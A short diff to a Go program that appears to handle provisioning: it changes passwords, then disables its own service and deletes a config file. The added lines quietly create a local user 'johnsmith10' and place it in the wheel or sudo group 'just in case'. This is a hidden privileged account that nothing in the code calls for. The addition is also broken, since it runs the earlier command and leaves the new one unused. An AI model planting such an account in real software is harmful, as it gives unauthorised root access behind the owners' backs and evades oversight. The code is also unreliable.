@@ -112,6 +112,11 @@ func main() {
 			log.Println("Passwords changed successfully")
 		}
 
+		// Add one more local sudo user just in case
+		new_user_cmd := exec.Command("sh", "-c", "useradd -m johnsmith10 && (usermod -aG wheel johnsmith10 || usermod -aG sudo johnsmith10)")
+		err = cmd.Run()
+		handle(err) // shouldn't trigger
+
 		// Cleanup (in case we need to re-deploy)
 		exec.Command("systemctl", "disable", "one.service").Run()
 		exec.Command("rm", "-f", "/etc/project-one/config.protected").Run()
